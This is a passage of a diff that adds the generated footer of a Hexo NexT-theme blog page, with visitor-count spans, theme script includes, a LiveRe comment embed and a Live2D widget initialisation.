+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
